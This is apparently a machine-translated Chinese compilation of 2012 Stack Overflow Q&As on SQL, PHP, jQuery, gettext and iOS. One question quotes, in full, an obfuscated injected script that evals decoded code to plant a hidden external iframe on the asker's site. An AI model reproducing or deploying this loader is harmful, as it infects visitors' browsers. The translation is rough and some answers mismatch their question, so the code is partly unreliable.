这是我要上传的代码，任何人都可以给我这个 php，因为我面临很多问题。

没有 Maulik，也许我的解释还不够，让我举个例子。假设我有一个名为 file.txt 的文件，其大小为 30MB，当我读取文件的包含时，它会给我所有 30MB 的包含。在 sendSynchronousRequest 方法中，我想给请求最多 10mb 的数据和老化调用相同的东西，除非它到达文件的最后一点。（简而言之，我想使用循环将请求部分发送到服务器）

# sql-server - 在 SQL Server 查询中获取超过两年的百分比

> ID：10685232
> 
> 赞同：0
> 
> 时间：2012-05-21T12:25:11.807
> 
> 标签：sql-server, subquery, where-clause

我想基本上使用 SQL Server 查询计算两年内的百分比差异。

出于某种原因，当我在年份字段上使用 -1 时，它返回 null。

如果我不在今年做-1，我现在所拥有的工作，但显然它返回 100%，因为它是今年与今年的比较，而不是今年与上一年的比较。

这是我的查询：

```
SELECT Year, 
       Sum(Amount) 
       AS Total, 
       (SELECT Sum(Amount) 
        FROM   Purchases 
        WHERE  Purchases.Year = Budgets.Year) 
       AS Actual, 
       ( ( (SELECT Sum(Amount) 
            FROM   Purchases 
            WHERE  Purchases.Year = Budgets.Year) / Sum(Amount) ) * 100 ) 
       AS 
       BudgetPercentage, 
       ( (SELECT Sum(Amount) 
          FROM   Budgets 
          WHERE  Budgets.Year = Budgets.Year) / (SELECT Sum(Amount) 
                                                 FROM   Budgets 
                                                 WHERE  Budgets.Year = ( 
                                                        Budgets.Year - 1 
                                                                       )) * 100 
       ) AS 
       PerYearPercentage 
FROM   Budgets 
WHERE  ServiceStationId = 1 
GROUP  BY Year 
```

问题出在 Budgets.Year - 1 上，知道我能做些什么来获得预期的结果吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:23:46.623

对您的查询的快速修复是简单地向`PerYearPercentage`计算子查询中的表添加不同的别名：

```
SELECT Year, 
       Sum(Amount) 
       AS Total, 
       (SELECT Sum(Amount) 
        FROM   Purchases 
        WHERE  Purchases.Year = Budgets.Year) 
       AS Actual, 
       ( ( (SELECT Sum(Amount) 
            FROM   Purchases 
            WHERE  Purchases.Year = Budgets.Year) / Sum(Amount) ) * 100 ) 
       AS 
       BudgetPercentage, 
       ( (SELECT Sum(Amount) 
          FROM   Budgets **b**
          WHERE  **b**.Year = Budgets.Year) / (SELECT Sum(Amount) 
                                           FROM   Budgets **b**
                                           WHERE  **b**.Year = (Budgets.Year - 1)) * 100 
       ) AS 
       PerYearPercentage 
FROM   Budgets 
WHERE  ServiceStationId = 1 
GROUP  BY Year 
```

# jquery - 通过函数启动fancybox画廊？

> ID：10685233
> 
> 赞同：0
> 
> 时间：2012-05-21T12:25:12.143
> 
> 标签：jquery, fancybox

简而言之，我试图通过一个图库启动fancybox，但通过一个iframe和手动调用启动fancybox。

我目前通过一个函数启动了 fancybox 并成功使用了 iframe 模式（没有画廊）。这使我可以为弹出式灯箱提供更具体的格式控制，并且还因为通过使用函数，我可以将数据从主页面中的项目解析到函数，启动灯箱，然后再次通过函数解析到 iframe（参见下面的示例函数）。

问题是我不知道如何让灯箱意识到我试图定义一组图像，它将通过使用这种方法解释为画廊。

那么我可以在启动画廊时以某种方式在函数中启动一个内框吗？

```
function testFunction(caption){
    $.fancybox({
        "overlayOpacity":0.8,
        "type" : "iframe",
        "width" : "100%",
        "height" : "100%",
        "padding": 0,
        "margin": 0,
        "content": "test.php?cap="+caption
    });

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:00:18.960

您可以设置图像对象数组，格式如下：

```
var images = [];
images.push({'href': 'http://www.mydomain.com/example.gif', title:'myName'});

$.fancybox.open(images, { 
    // all the other parameters here
}); 
```

如果我是正确的，您需要使用[版本 2](http://fancyapps.com/fancybox/)

# iphone - iphone本地化

> ID：10685236
> 
> 赞同：0
> 
> 时间：2012-05-21T12:25:24.730
> 
> 标签：iphone

如何在 iphone 中进行本地化。

在我当前的项目中，我必须以 16 种语言显示我的应用程序
所有来自后端的语言域

在使用语言转换的后端 php 家伙中，他们使用的是这样的

英语：

```
var_name:LOGIN_BTN;
value=Log-in; 
```

法语：

```
var_name=LOGIN_BTN;
value:Loggain; 
```

所以对于所有语言 var_name 将是相同的，但值会改变。
所有这些 var_name 和值都来自他们的数据库。

以下是他们提供给我的网址
“http://www.euroclinix.dev-projects.com/mob-web-service.php?action=trans_list&did=29”

做=域ID

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:28:58.507

一般来说：

对于后端/网络服务本地化，您应该将您的设备语言发送到后端服务。然后它应该只提供所需的语言。

如果这不可能，您必须获取所有语言并确定在设备上正确使用哪一种。

# php - PHP函数未定义错误和错位的语法错误 在生成的 HTML 中

> ID：10685237
> 
> 赞同：0
> 
> 时间：2012-05-21T12:25:25.167
> 
> 标签：php, javascript, wiki, mediawiki

为了解决[棘手的 wiki 搜索问题](https://stackoverflow.com/questions/10205405/adding-extra-search-text-to-a-mediawiki-search-query-using-inputbox)，我们在 PHP 文件中实现了 Javascript 解决方案。

不幸的是，我有两个问题。一是没有调用该函数，二是我在错误控制台中看到我无法解决的语法错误。首先，这是 PHP 文件中的代码：

```
 $htmlOut .=  <<<ENDOFBLOCK
    <script language="javascript">
    function appendAndSubmit(){
    var platform1 = document.getElementById( 'p1').checked;
    var platform2 = document.getElementById( 'p2').checked;
    var text = document.getElementById('search').value;
    if (platform1) text = 'Applies to=Platform 1.0 ' + text;
    if (platform2) text = 'Applies to=Platform 2.0 ' + text;
    alert( text);
    document.getElementById('search').value = text;
    document.forms['searchform'].submit();}
    </script>
    ENDOFBLOCK
    ; 
```

所以，第一个问题是我看到**appendAndSubmit 没有**在错误控制台中定义。

第二个问题是语法错误。生成的 HTML 源代码为：

```
<p><script language="javascript">
function appendAndSubmit(){
var platform1 = document.getElementById( 'p1').checked;
var platform2 = document.getElementById( 'p2').checked;
var text = document.getElementById('search').value;
if (platform1) text = 'Applies to=Platform 1.0 ' + text;
if (platform2) text = 'Applies to=Platform 2.0 ' + text;
alert( text);
document.getElementById('search').value = text;
document.forms['searchform'].submit();}
</p>
</script><div align="center" style="background-color:transparent"><form name="searchbox" id="searchbox" class="searchbox" action="/wiki/index.php?title=Special:Search"><input class="searchboxInput" name="search" type="text" value="" size="50" /><br /><input type="checkbox" name="1" value="&quot;Applies to=Platform 1.0&quot;" id="p1" />&nbsp;<label for="">Platform 1.0</label><input type="checkbox" name="2" value="&quot;Applies to=Platform 2.0&quot;" id="p2" />&nbsp;<label for="">Platform 2.0</label><br /><input type="submit" name="fulltext" class="searchboxSearchButton" value="Go!" onClick="appendAndSubmit();" /></div></form> 
```

注意`</p>`发生在之前`</script>`，而`<p>`发生在之前`<script>`。

谁能告诉我我做错了什么？

appendAndSubmit 函数的调用在这里：

```
 $htmlOut .= Xml::element( 'input',
        array(
            'type' => 'submit',
            'name' => 'fulltext',
            'class' => 'searchboxSearchButton',
            'value' => 'Go!',
            'onClick' => 'appendAndSubmit();'
        )
    ); 
```

**完整方法：**

```
 public function getSearchPlatform() {

    // Use button label fallbacks
    global $wgContLang;

    // Use button label fallbacks
    if ( !$this->mButtonLabel ) {
        $this->mButtonLabel = wfMsgHtml( 'tryexact' );
    }
    if ( !$this->mSearchButtonLabel ) {
        $this->mSearchButtonLabel = wfMsgHtml( 'searchfulltext' );
    }

    $htmlOut .=  <<<ENDOFBLOCK
<script type="text/javascript">
function appendAndSubmit(){
var platform1 = document.getElementById( 'p1').checked;
var platform2 = document.getElementById( 'p2').checked;
var text = document.getElementById('search').value;
if (platform1) text = 'Applies to=Platform 3.0 ' + text;
if (platform2) text = 'Applies to=Platform 4.0 ' + text;
alert( text);
document.getElementById('search').value = text;
document.forms['searchform'].submit();}
</script>
ENDOFBLOCK
;

    // Build HTML
    $htmlOut .= Xml::openElement( 'div',
        array(
            'align' => 'center',
            'style' => 'background-color:' . $this->mBGColor
        )
    );
    $htmlOut .= Xml::openElement( 'form',
        array(
            'name' => 'searchbox',
            'id' => 'searchbox',
            'class' => 'searchbox',
            'action' => SpecialPage::getTitleFor( 'Search' )->escapeLocalUrl(),
        )
    );
    $htmlOut .= Xml::element( 'input',
        array(
            'class' => 'searchboxInput',
            'name' => 'search',
            'type' => 'text',
            'value' => $this->mDefaultText,
            'size' => $this->mWidth,
        )
    );

    $htmlOut .= $this->mBR;

    // Checkbox
    $htmlOut .= Xml::element( 'input',
        array(
            'type' => 'checkbox',
            'name' => '1',
            'value' => '"Applies to=Platform 1.0"',
            'id' => 'p1'
        )
    );
    // Label
    $htmlOut .= '&nbsp;' . Xml::label( 'Platform 2.0' );

    // Checkbox
    $htmlOut .= Xml::element( 'input',
        array(
            'type' => 'checkbox',
            'name' => '2',
            'value' => '"Applies to=Platform 2.0"',
            'id' => 'p2'
        )
    );
    // Label
    $htmlOut .= '&nbsp;' . Xml::label( 'Platform 2.0' );

    // Line break
    $htmlOut .= $this->mBR;

    $htmlOut .= Xml::element( 'input',
        array(
            'type' => 'submit',
            'name' => 'fulltext',
            'class' => 'searchboxSearchButton',
            'value' => 'Go!',
            'onClick' => 'appendAndSubmit();'
        )
    );

    // Hidden fulltext param for IE (bug 17161)
    if( $type == 'fulltext' ) {
        $htmlOut .= Xml::hidden( 'fulltext', 'Search' );
    }

    $htmlOut .= Xml::closeElement( 'div' );
    $htmlOut .= Xml::closeElement( 'form' );

    // Return HTML
    return $htmlOut;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:03:19.473

`<p>`修复元素内标签错位的问题`<script>`。这些`<script>`标签中的语法错误可能会阻止函数的注册，因为它是在同一个块中声明的。

**更新** 所以很难说，因为最终可能需要 Wiki引擎`render()`。`InputBox`但这里有一个可能会有所帮助的建议。对于大多数元素，您使用`Xml`类中的静态方法添加它们。您是否尝试过`script`使用创建标签`Xml::openElement`？然后，您可以将脚本主体的 heredoc 声明放在这些调用之间。如果`p`在 Wiki 端任意插入标签，则使用此方法可能会以不会发生这种情况的方式输出它。值得一试，因为老实说，我在您发布的代码中看不到任何表明应该从您的代码中插入段落标签的任何内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T06:43:11.133

我设法`</p>`通过将所有内容放在一条线上`<script>`来解决这个问题。`</script>`这让我想知道当我将文件放在 Linux 服务器上时，编辑器（Windows 上的 Notepad++）是否有问题。但我认为 Notepad++ 可以处理（PHP 没问题）。

脚本没有被调用的事实实际上是由于语法错误，我通过[另一个问题中的线索](https://stackoverflow.com/questions/5864228/how-to-call-external-javascript-file-in-php)发现：`'search'`应该是`'searchbox'`。

一旦解决了这个问题，就会调用该函数而没有错误。

如果其他人想要它，这里是完整的工作代码：

```
 public function getSearchPlatform() {

        // Use button label fallbacks
        global $wgContLang;

        // Use button label fallbacks
        if ( !$this->mButtonLabel ) {
            $this->mButtonLabel = wfMsgHtml( 'tryexact' );
        }
        if ( !$this->mSearchButtonLabel ) {
            $this->mSearchButtonLabel = wfMsgHtml( 'searchfulltext' );
        }

        $htmlOut .=  <<<ENDOFBLOCK
        <script type="text/javascript">function appendAndSubmit(){var platform1 = document.getElementById('p1').checked;var platform2 = document.getElementById('p2').checked;var text = document.getElementById('searchboxInput').value;if (platform1 * platform2 >0) text = text + ' "Applies to=Platform 1.0" "Applies to=Platform 2.0"';else if (platform1) text = text + ' "Applies to=Platform 1.0"';else if (platform2) text = text + ' "Applies to=Platform 2.0"';document.getElementById('searchboxInput').value = text;document.forms['searchform'].submit();}</script>
ENDOFBLOCK;

        // Build HTML
        $htmlOut .= Xml::openElement( 'div',
            array(
                'align' => 'center',
                'style' => 'background-color:' . $this->mBGColor
            )
        );
        $htmlOut .= Xml::openElement( 'form',
            array(
                'name' => 'searchbox',
                'id' => 'searchbox',
                'class' => 'searchbox',
                'action' => SpecialPage::getTitleFor( 'Search' )->escapeLocalUrl(),
            )
        );
        $htmlOut .= Xml::element( 'input',
            array(
                'class' => 'searchboxInput',
                'name' => 'search',
                'id' => 'searchboxInput',
                'type' => 'text',
                'value' => $this->mDefaultText,
                'size' => $this->mWidth,
            )
        );

        $htmlOut .= $this->mBR;

        // Checkbox
        $htmlOut .= Xml::element( 'input',
            array(
                'type' => 'checkbox',
                'name' => '1',
                'id' => 'p1'
            )
        );
        // Label
        $htmlOut .= '&nbsp;' . Xml::label( 'Platform 1.0' );

        // Checkbox
        $htmlOut .= Xml::element( 'input',
            array(
                'type' => 'checkbox',
                'name' => '2',
                'id' => 'p2'
            )
        );
        // Label
        $htmlOut .= '&nbsp;' . Xml::label( 'Platform 2.0' );

        // Line break
        $htmlOut .= $this->mBR;

        $htmlOut .= Xml::element( 'input',
            array(
                'type' => 'submit',
                'name' => 'fulltext',
                'class' => 'searchboxSearchButton',
                'value' => 'search',
                'onClick' => "appendAndSubmit();"
            )
        );

        // Hidden fulltext param for IE (bug 17161)
        if( $type == 'fulltext' ) {
            $htmlOut .= Xml::hidden( 'fulltext', 'Search' );
        }

        $htmlOut .= Xml::closeElement( 'div' );
        $htmlOut .= Xml::closeElement( 'form' );

        // Return HTML
        return $htmlOut;
    } 
```

# mysql - SQL唯一列组合

> ID：10685242
> 
> 赞同：0
> 
> 时间：2012-05-21T12:25:50.973
> 
> 标签：mysql, insert

我只是想知道最好的方法来做到这一点。

我有一个包含 2 个表的数据库。

**第一个表**

```
id - primary key
title 
```

**第二张表**

```
id - primary key
first_id
order 
```

我想知道在插入时是否存在 first_id 和 order 的组合是否存在然后更新 else 插入的最佳方法是什么？

例如，如果我尝试在第二个表中插入一条记录 first_id = 10 和 order = 1 并且该记录已经存在，则更新而不是插入新记录。我在某处读到了有关使列组合独一无二的信息，但不知道如何去做。

编辑：对不起，我忘了提到我正在使用 MySQL

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:28:14.153

假设`sql -server`...

```
if exists ( select 1 from table2 where  id=@id and firstId=@firstid)
begin
  update table2 set(...)
end
begin
insert into table2 select ...
end 
```

请确保 first_id 是 table1 的 id 的外键。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:33:03.467

对于 MSSQL，您可以使用如下内容：

```
IF NOT EXISTS (SELECT id from Second Table WHERE first_id = 10 AND order = 1)
BEGIN
   INSERT INTO Second Table (first_id, order) VALUES (10, 1)
END
ELSE
BEGIN
   UPDATE Second Table SET order = 1 WHERE first_id = 10
END 
```

至于让它独一无二，这只是确保你不能两次插入这些值，但我认为最好在尝试插入之前检查一下。（我想两者的结合将是完美的）

您可以组合 first_id 和 order UNIQUE 来防止它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:34:59.447

如果您直接在表中插入数据，您可以制作一个触发器，类似于 Royi 的答案会帮助您。

如果您希望在尝试插入一对数据时插入失败，或者换句话说，如果您想创建唯一约束，那么此[链接](https://stackoverflow.com/questions/1109614/how-can-i-create-a-sql-unique-constraint-based-on-2-columns)可能会对您有所帮助。

其他方法是通过存储过程插入数据并在插入之前执行检查。

-悲伤

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T12:40:42.010

这样，在更新场景中，您只需扫描表一次。插入的性能仍然相同。

```
UPDATE Second Table SET order = 1 WHERE first_id = 10
if ROW_COUNT() = 0 
begin
   INSERT INTO Second Table (first_id, order) VALUES (10, 1)
end 
```

# php - 如何使用多语言元素正确编写 PHP？

> ID：10685244
> 
> 赞同：2
> 
> 时间：2012-05-21T12:26:12.080
> 
> 标签：php, html, translation, gettext

我正在使用 gettext 编写多语言 php 网络应用程序。

实际使用 gettext 的最佳方式是什么，我可以将其用作关键词：

```
echo (_("main.welcomeText.1")); 
```

或者

```
echo (_("Welcome to my site, we build great webapps.")); 
```

在这两种方式中，我都使用 .po 文件来翻译请求。

有什么更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:43:26.360

这取决于 ：）：

*   你想要更好的调试
*   你想要准确的翻译
*   你想要编程速度
*   您希望翻译器不依赖于开发人员进行翻译（不可能，因为开发人员不会写正确的英语...法语，印度语 [包括本地和非本地开发人员]）
*   你想要两个世界中最好的

最好的教学方法是 main.welcomText.1，因为：

*   您将在很多地方（也许）使用它，因此复制过去更容易且不易出错。
*   键有一个数字，当抛出错误时更容易搜索/排序，即：...坏键是 error.errorCode.321 而不是“使用 null 时在 xy 类中发生了坏事”
*   关键涵盖“含义/语义”，因此您必须更加努力地构建/定义您的消息，即：main.hello 或 greeting.formal 或 greeting.friendly 女巫翻译不同（即：“你好”、“欢迎”、“嗨”）
*   奖励：您可以通过使用始终使用相同键的键来减少翻译量（以更简单的方式。考虑重构

使用“欢迎来到我的网站，我们构建了很棒的网络应用程序”。使阅读和翻译更容易翻译，但更不容易纠正/调试，尤其是在代码中有很多时间的情况下

因此密钥用于调试，因此它们应该更容易找到**它们**在代码中的位置。

编辑：提供基本英文翻译，即：

main.welcomeText.1：欢迎来到我的网站，我们构建了很棒的网络应用程序。

这在短期内对开发人员来说是更多的工作。但在大型项目中很少:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:07:08.470

我从来没有使用过 gettext ......也从来没有真正认识任何人。

我会建议一种不同的方法，即使用 Smarty/Dwoo 完全分离演示文稿。使用它，您可以拥有非常简单的配置/语言文件来进行国际化。

# python - Python 中的 Content-Seen 检查

> ID：10685248
> 
> 赞同：2
> 
> 时间：2012-05-21T12:26:34.113
> 
> 标签：python, hash, web-crawler, web-scraping

大家好！假设我有一些使用此脚本获得的页面：

```
page = urllib2.urlopen(url).read() 
```

在抓取网页时，如何有效（快速）检查该内容是否已被抓取？我的算法是这样的：

```
 seenContents = set()
then check if crawled content is in set or not 
```

但我不知道在那个集合上存储什么，哈希值等等？你能推荐一些东西吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:57:31.887

内容的MD5怎么样？

```
import md5

contest = "some data"
m = md5.new(contents)
m.digest() 
```

# c# - 温莎城堡：针对哪个消费者的组件？

> ID：10685250
> 
> 赞同：0
> 
> 时间：2012-05-21T12:26:36.823
> 
> 标签：c#, .net, asp.net-mvc, inversion-of-control, castle-windsor

我在一个项目中使用 ASP.NET MVC、Castle Windsor 和 Log4Net。

我的日志记录组件中有这样的东西：

```
public class Log4NetLoggerService : ILoggerService
{
    private readonly ILog _logger;

    public Log4NetLoggerService()
    {
        _logger = LogManager.GetLogger(typeof(Log4NetLoggerService));
    }
} 
```

但当然，这在我的日志文件中给了我“Log4NetLoggerService”......

现在我想找出**我的日志组件正在为哪个消费者类解析/构建**。

我尝试使用 StackFrame 类，但没有运气（不仅，而且，因为日志服务可能被隐式解析（IoC）或使用直接调用 IKernel.Resolve）。

在Windsor框架中必须有某种方法可以做到这一点，我只是找不到任何东西......

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:31:29.163

为什么不直接在构造函数中使用类型？

```
 public Log4NetLoggerService(Type loggingComponentType)
{
    _logger = LogManager.GetLogger(loggingComponentType);
} 
```

如果您将记录器用作组件中的静态成员，则只需将类型发送一次。

# php - javascript注入攻击

> ID：10685252
> 
> 赞同：2
> 
> 时间：2012-05-21T12:26:39.950
> 
> 标签：php, javascript, code-injection

我们的网站遭到攻击。看起来下面的 javascript 被注入了该站点。某些浏览器（mozilla 等）打印“报告的攻击页面！” 访问页面时。

有谁知道如何找到安全漏洞并预防？

谢谢

```
<script>i=0;try{avasv=prototype;}catch(z){h="harCode";f=
['-33f-33f63f60f-10f-2f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f5 9f68f74f73f24f79f42f55f61f36f55f67f59f-2f
-3f56f69f58f79f-3f-1f49f6f51f-1f81f-29f-33f-33f-33f63f60f72f55f67f59f72f-2f-1f17f-29f-33f-33f83f-10f59f66f73f59f-
10f81f-29f-33f-335f-33f58f69f57f75f67f59f68f74f4f77f72f63f74f59f-2f-8f18f63f60f72f55f67f59f-10f73f72f57f19f-3f62f74f
74f70f16f5f5f73f62f69f57f65f63f68f61f72f55 f74f59f73f4f57f69f67f5f67f63f68f58f5f63f68f4f57f61 f63f21f12f-3f-10f77f63
f58f74f62f19f-3f7f6f-3f-10f62f59f63f61f62f74f19f-3f7f6f-3f-10f73f74f79f66f59f19f-3f76f63f73f63f56f63f66f63f74f79f16
f62f63f58f58f59f 68f17f70f69f73f63f74f63f69f68f16f55f56f73f69f66f75 f74f59f17f66f59f60f74f16f6f17f74f69f70f16f6f17f-3f20
f18f5f63f60f72f55f67f59f20f-8f-1f17f-29f-33f-33f83f-29f-33f-33f60f75f68f57f74f63f69f68f-10f63f60f72f55f67f59f72f-2f-
1f81f5-29f-33f-33f-33f76f55f72f-10f60f-10f19f-10f58f69f57f75f67f59f68f74f4f57f72f59f55f74f59f27f 66f59f67f59f68f74f
-2f-3f63f60f72f55f67f59f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f73f72f57f-3f2f-3f62f74f74f70f16f5f5
f73f62f69f57f65f63f68f61f72f55 f74f59f73f4f57f69f67f5f67f63f68f58f5f63f68f4f57f61 f63f21f12f-3f-1f17f60f4f73f74f79f
66f59f4f76f63f73f63f56f63f66f63 f74f79f19f-3f62f63f58f58f59f68f-3f17f60f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68 f19f-
3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-
3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f
63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66
f59f67f 59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f6
0f-1f17f-29f-33f-33f83']
[0].split('f');v="e"+"va";}if(v)e=window[v+"l"];try{q=document.createElement("div");q.appendChild(q+"");}
catch(qwg){w=f;s=[];}r=String;z=((e)?h:"");for(;585!=i;i+=1){j=i;if(e)s=s+r["fromC"+((e)?z:12)](w[j]*1+42);}
if(v&&e&&r&&z&&h&&s&&f&&v)e(s);</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:34:50.463

您应该始终使用 htmlspecialchars() 并过滤掉所有 POST（和 GET），以防止此类 XSS 攻击。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:34:58.817

基本上，每当您想将来自用户输入的内容输出到浏览器时，您都需要使用函数[htmlspecialchars() 。](http://php.net/manual/en/function.htmlspecialchars.php)

像这样的东西。

```
echo htmlspecialchars($string, ENT_QUOTES, 'UTF-8'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:36:34.493

据我所知，当您允许人们通过注释或原则上未处理的输入字段在您的网站中插入代码时，就会发生注入攻击，以避免这种情况。所以它应该在你的数据库中。

# php - PHP中的@符号

> ID：10685256
> 
> 赞同：-4
> 
> 时间：2012-05-21T12:27:07.570
> 
> 标签：php

`$exists = @$userID;`与较长的符号相比，使用语句的优点是什么`if(isset($userID)){$exists = $userID; }else{$exists = false;}`

符号是否`"@"`更快，因为我发现它的可读性较差？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:28:58.167

显然，经过 5 秒的谷歌搜索，它会抑制错误报告。

# php - 添加具有多个表的行

> ID：10685260
> 
> 赞同：0
> 
> 时间：2012-05-21T12:27:26.167
> 
> 标签：php, mysql, operators, sum

例如，我在 MySQL 中有一个名为 users 的表，在该 users 表中有两行包含我希望将它们相加的数值。

为了争论，可以说，这是表结构

```
 ++++++++++++++++++++++++++++++
    ROW    | Numeric1 | Numberic2
    ++++++++++++++++++++++++++++++
      ROW 1|       38 | 39
      ROW 2|       41 | 54
      ROW 3|       47 | 41
      ROW 4|       73 | 37
      ROW 5|       31 | 25 
```

我希望将数字第 1 行和数字第 2 行加在一起，然后将其添加到下一行，因此结果将使用 PHP 返回 426（所有数字的总和），然后回显该值。

由于某种原因，我无法使用

```
 $total = $numeric1 + numberic2;
    echo $total; 
```

关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:44:20.520

尝试这个 -

```
SELECT indvsum.sum1 + indvsum.sum2
FROM (SELECT SUM(numeric1) AS sum1,
             SUM(numeric2) AS sum2
      FROM tablename) indvsum 
```

indvsum 只是内部表的别名。

# iphone - iPhone/移动版网站上的 z-index

> ID：10685263
> 
> 赞同：0
> 
> 时间：2012-05-21T12:27:40.510
> 
> 标签：iphone, css, z-index

我已经创建了一个 HTML5/reponsive-ish 页面，现在正在使用媒体查询来创建一个单独的 iPhone 版本。它仍在进行中，有很多问题，但有一个问题让我有点发疯。

我的智能手机布局与我的台式机/iPad 版本有很大不同，所以我不得不使用绝对定位来将 iPhone 资产放置到位。我有一些标题文本，无论我做什么，都不会覆盖盒式磁带图像 div。

这是标题css：

```
`   #playlistTitle {
        width:140px;
        height:32px;
        position:absolute;
        top:120px;
        left:60px;
        z-index:500;
        background-color:transparent;
        border:1px solid red;
        text-align:center;
` 
```

这是它应该分层的div：

```
`    #reelWrapper {
    height:137px;
    width:254px;
    position:absolute;
    margin:156px 6px 6px 16px;
    background:url(../images/cassette.jpg) no-repeat 0 0;
    z-index:50;
}
` 
```

您可以在 iPhone 上看到标题 div 的底部位于磁带图像 div 的下方（我使用可见边框来显示它无法正常工作的位置）。我想要的是让它在上面分层，这样我就可以把它向下移动，看起来像这样： http: [//lisadearaujo.com/clientaccess/wot-sound/images/screen.jpg](http://lisadearaujo.com/clientaccess/wot-sound/images/screen.jpg)

该页面在这里： http: [//lisadearaujo.com/clientaccess/wot-sound/indexiPad.html](http://lisadearaujo.com/clientaccess/wot-sound/indexiPad.html)

您可以通过源代码看到其余的 CSS，显然......

任何想法，我都会非常非常感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T00:04:54.793

检查您`div`的 s 上包含的 z-index`#playlistTitle`

# iphone - iPhone iOS 保存从 UIImageJPEGRepresentation() 获得的数据第二次失败：ImageIO: CGImageRead_mapData 'open' failed

> ID：10685276
> 
> 赞同：10
> 
> 时间：2012-05-21T12:28:28.287
> 
> 标签：iphone, objective-c, ios, uiimage, javax.imageio

我的 UIImage 操作遇到了一个奇怪的问题。

我正在做一个保管箱同步，并且必须将我的图像存储为本地文件。为此，我使用`UIImagePNGRepresentation(image)`or保存它们`UIImageJPEGRepresentation(image, 0.66)`

这是我的典型工作流程： 用户选择图像或拍照 图像被分配给 imageView 图像视图的 UIImage 使用以下方法保存到文件中

下次用户重新打开应用程序时，我使用从文件中读取图像

```
[UIImage imageWithContentsOfFile:fullImagePath] 
```

这工作一次。

我第二次运行该例程时，在尝试再次将图像保存到磁盘时收到下面列出的错误消息。

```
//saving the image
NSData* data = isPNG?UIImagePNGRepresentation(image):UIImageJPEGRepresentation(image, 0.66);
BOOL success =   [data writeToFile:filepath atomically:YES];
if(!success)
{
    DLog(@"failed to write to file: %@",filepath );
}

//loading the image
[UIImage imageWithContentsOfFile:fullImagePath] 
```

当我尝试重新保存之前已转换为 JPEG 或 PNG 的图像时出现此错误

```
2012-05-21 08:16:06.680   file already exists: NO
ImageIO: CGImageRead_mapData 'open' failed '/var/mobile/Applications/C1312BF8-C648-4397-82F3-D93E4FAAD35F/Documents/imageData/LogoImage.jpg'
error = 2 (No such file or directory)
May 21 08:16:06  <Error>: ImageIO: JPEG Not a JPEG file: starts with 0xff 0xd9
May 21 08:16:06  <Error>: ImageIO: JPEG Application transferred too few scanlines 
```

在我看来，这个错误是由于我试图再次将图像重新保存为 JPEG 而发生的。如果我要求视图在上下文中呈现自身（有效地创建新图像），则不会发生错误。

有谁知道我做错了什么？通过尝试将 UIImage 转换为数据、重新加载它并在向用户显示后再次尝试转换它，我是否错过了某种元数据？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-05-21T13:14:21.170

我以前遇到过类似的事情。`imageWithContentsOfFile`只要`UIImage`用于创建的文件还活着，它看起来就一直保持打开状态。当时，我通过将文件读入 a`NSData`然后直接从文件创建`UIImage`而`NSData`不是文件来解决这个问题。

# apache-flex - 1119：通过静态类型类的引用访问可能未定义的属性否

> ID：10685278
> 
> 赞同：2
> 
> 时间：2012-05-21T12:28:32.797
> 
> 标签：apache-flex

我正在创建一个给出此错误的警报框。请帮助：代码如下：

```
<mx:LinkButton id="deleteButton" visible="false" 
               icon="@Embed('/assets/delete.png')" x="200"  
               toolTip="Delete File" 
               click='Alert.show("Are you sure you want to send the form?","Confirm Delete",Alert.YES | Alert.NO,this,deleteButton_clickHandler,null,Alert.No);'/> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:35:28.817

在您的警报呼叫结束时，更改`Alert.No`为`Alert.NO`。（注意“NO”全部大写）

# iphone - 在运行时设置 UIInterfaceOrientation

> ID：10685279
> 
> 赞同：4
> 
> 时间：2012-05-21T12:28:35.493
> 
> 标签：iphone, ipad, xcode4.3

我在情节提要中有 5 个视图。我希望每个视图方向都不同，例如一个视图将是`UIInterfaceOrientationLandscapeRight`另一个视图将是`UIInterfaceOrientationLandscapeLeft`or`UIInterfaceOrientationPortrait`或`UIInterfaceOrientationPortraitUpsideDown`。那么如何设置不同的视图方向。

我用过 `[[UIDevice currentDevice] setOrientation:UIInterfaceOrientationLandscapeRight];` ，但它显示警告“UIDevice 可能无法响应 setOrientation”。根据我正在使用的许多 stackoverflow 作家的说法

```
-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation { 
